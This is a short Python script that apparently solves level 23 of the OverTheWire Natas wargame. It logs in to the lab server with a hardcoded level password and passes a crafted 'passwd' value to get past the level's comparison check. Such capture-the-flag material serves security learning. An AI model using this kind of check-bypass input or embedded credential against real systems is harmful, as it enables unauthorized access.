# Overthewire: Natas 23
# woanmeo11

import requests


url = 'http://natas23.natas.labs.overthewire.org/'
auth = ('natas23', 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE')

r = requests.get(url, auth=auth, params={'passwd': '123iloveyou'})
print(r.text)
